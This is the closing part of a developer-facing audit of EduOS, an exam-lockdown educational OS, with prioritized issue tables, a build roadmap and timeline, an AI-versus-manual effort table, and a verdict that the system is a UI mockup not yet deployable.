| 20 | Anti-cheat clipboard bypass (1.12) | 1h |
| 21 | TTY escape not blocked (V3) | 2h |
| 22 | USB boot not blocked (V2) | 3h |
| 23 | Screen capture not blocked (V4) | 1h |
| 24 | Hardcoded encryption key (1.7) | 1h |
| 25 | SQLite not encrypted (V13) | 2h |
| 26 | Faculty real-time dashboard (M5) | 8h |
| 27 | Admin audit logging (M8) | 3h |
| 28 | Plagiarism detection (M4) | 3h |

### P4 — Nice to Have

| # | Issue | Effort |
|---|-------|--------|
| 29 | ISO build caching + checksum (C4, C5) | 2h |
| 30 | CI pipeline with linting + tests (C1-C3) | 3h |
| 31 | Lab environment snapshots (M7) | 3h |
| 32 | Update rollback mechanism (M9) | 4h |
| 33 | MAC-based admin auth (M10) | 2h |
| 34 | Feedback system (M6) | 2h |

### P5 — Cosmetic/Minor

| # | Issue | Effort |
|---|-------|--------|
| 35 | Unused imports cleanup | 1h |
| 36 | Docstrings on critical functions | 2h |
| 37 | Function splitting (>100 line funcs) | 2h |
| 38 | Design system deduplication | 1h |
| 39 | `signal.SIG_DFL` fix | 5 min |
| 40 | Autosave filename collision fix | 10 min |

---

## SECTION 7: WHAT TO BUILD NEXT

### Immediate (Weeks 1-2)
1. **Fix authentication** — Without this, nothing else matters. Add password hashing, fix login/register, add RBAC.
2. **Implement real ExamLockdown** — iptables, TTY blocking, process killer, USB lock. This is the core of Exam Mode and it's currently a stub.
3. **Configurable daemon URLs** — Fix the 4 system daemons so they actually work.
4. **WebSocket communication** — Replace HTTP polling with proper WebSocket for real-time exam monitoring.

### Short-term (Weeks 3-4)
5. **Student authentication** — One-time exam codes, session management.
6. **Crash recovery + reconnection** — Autosave 15s, resume on restart, server-side answer cache.
7. **Faculty dashboard** — Real-time exam monitoring web interface.
8. **TLS + rate limiting** — 기본 security hardening.

### Medium-term (Weeks 5-8)
9. **Admin audit logging** — Track all admin actions.
10. **Plagiarism detection** — Code similarity checking.
11. **Offline fallback** — Local SQLite cache, submission queue.
12. **Update rollback mechanism**

### What AI Can Build (vs Manual Work)

| Feature | AI-Assist | Manual Required |
|---------|-----------|-----------------|
| Auth system (password hashing, JWT) | 90% | Final security review |
| ExamLockdown (iptables, TTY, USB) | 60% | Kernel-level config, testing |
| WebSocket real-time monitoring | 80% | Production hardening |
| Student auth one-time codes | 85% | Edge cases |
| Crash recovery / autosave | 90% | Testing across scenarios |
| Plagiarism detection | 95% | Threshold tuning |
| Faculty dashboard | 80% | UI polish |
| ISO build pipeline | 70% | Caching strategy, debugging |
| CI/CD with tests | 85% | Test coverage decisions |
| Update rollback | 60% | Package manager internals |
| Offline fallback | 70% | Sync conflict resolution |

### Realistic Timeline (Solo Developer)

| Milestone | Time | Deliverable |
|-----------|------|-------------|
| **MVP** (Auth + Lockdown + Basic Exam) | 3-4 weeks | Can run an exam with 30 students in a lab |
| **Beta** (+ WebSocket + Dashboard + Recovery) | 6-8 weeks | Faculty can monitor exams in real time |
| **Production v1** (+ TLS + Audit + Plagiarism + Offline) | 10-12 weeks | Deployable in a real college lab |
| **Full v2** (+ Update System + CyberLab + Feedback) | 16-20 weeks | Complete EduOS platform |

**Key risk**: The ExamLockdown needs kernel-level work (TTY, USB, iptables) that is hard to test without a real machine. VirtualBox testing won't catch all edge cases.

---

## FINAL VERDICT

**EduOS is currently a UI mockup with ambitious architecture but critically shallow backend implementation.** 

The good news: the UI layer is well-built (PyQt6, design system, glass theme). The package structure is clean. The ISO build pipeline exists and is close to working.

The bad news: authentication doesn't work, exam lockdown does nothing, system daemons poll non-existent domains, and WebSocket communication is entirely missing. **The system is not deployable in its current state.**

The code shows a talented UI developer who needs to invest in backend security fundamentals. The P1 fixes (especially auth and lockdown) are non-negotiable before any real deployment.

---

*End of Audit*
